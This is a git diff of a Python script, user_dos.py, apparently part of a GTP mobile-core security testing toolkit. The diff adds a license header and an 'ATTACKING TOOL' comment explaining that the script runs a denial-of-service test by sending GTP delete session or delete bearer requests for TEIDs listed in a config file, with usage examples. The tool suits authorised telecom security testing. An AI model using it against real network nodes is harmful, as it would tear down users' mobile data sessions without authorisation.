@@ -1,21 +1,37 @@
 #!/usr/bin/env python
 # encoding: utf-8
-'''
-main -- shortdesc
+#       user_dos.py
+#       
+#       Copyright 2018 Rosalia d'Alessandro 
+#                     
+#
 
-main is a description
-
-It defines classes_and_methods
-
-@author:     Rosalia d'Alessandro
-
-@copyright:  2017. All rights reserved.
-
-@license:    license
-
-@contact:    list_mailing@libero.it
-'''
-
+#       Redistribution and use in source and binary forms, with or without
+#       modification, are permitted provided that the following conditions are
+#       met:
+#       
+#       * Redistributions of source code must retain the above copyright
+#         notice, this list of conditions and the following disclaimer.
+#       * Redistributions in binary form must reproduce the above
+#         copyright notice, this list of conditions and the following disclaimer
+#         in the documentation and/or other materials provided with the
+#         distribution.
+#       * Neither the name of the  nor the names of its
+#         contributors may be used to endorse or promote products derived from
+#         this software without specific prior written permission.
+#       
+#       THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS
+#       "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT
+#       LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR
+#       A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT
+#       OWNER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL,
+#       SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT
+#       LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE,
+#       DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY
+#       THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT
+#       (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE
+#       OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
+#
 import os
 import sys
 from optparse import OptionParser
@@ -31,6 +47,28 @@ GTP_PORT = 2123
 DEFAULT_MSG_FREQ = 20
 DEFAULT_SLEEPTIME = 1
 DEBUG = 0
+
+
+##
+## ATTACKING TOOL 
+## 
+## @brief      Main file to execute the script.
+## 
+## This file can test a DoS attack sending a delete session request (36) or 
+## delete bearer request (66) using one or more TEIDS.TEIDs are listed in the 
+## config file.
+## 
+## Use the -h option to enter the help menu and determine what to do.
+## 
+## Basic usage examples:
+##      * $ python user_dos.py -v -c conf_file.cnf [-c conf2.cnf ...] -r <remote ip> 
+#            act as a client connecting to <remote-host-ip>
+##      
+##      * $ python user_dos.py -lv  -c conf_file.cnf [-c conf2.cnf ...] -r <remote ip>
+##      
+##           act as a server listening on 0.0.0.0 and accepting replies from <remote-host-ip>
+##
+## Example configuration file: UserDos.cnf
 
 def main(argv=None):
     '''Command line options.'''
@@ -60,7 +98,7 @@ def main(argv=None):
         
         # set defaults
         parser.set_defaults(listening_mode=False,
-                            config_file="../config/DeleteSession.cnf", 
+                            config_file="../config/UserDoS.cnf", 
                             verbose = False)
 
         # process options
@@ -86,7 +124,8 @@ def main(argv=None):
         msgs = config.get_unpacked_messages()
        
         lstn = MessageHandler(messages = msgs, peer = remote_net, 
-                              isVerbose = is_verbose, listening_mode = listening_mode,
+                              isVerbose = is_verbose, 
+                              listening_mode = listening_mode,
                               msgs_freq = msg_freq, wait_time = sleep_time)  
         if lstn : 
             lstn.daemon = True
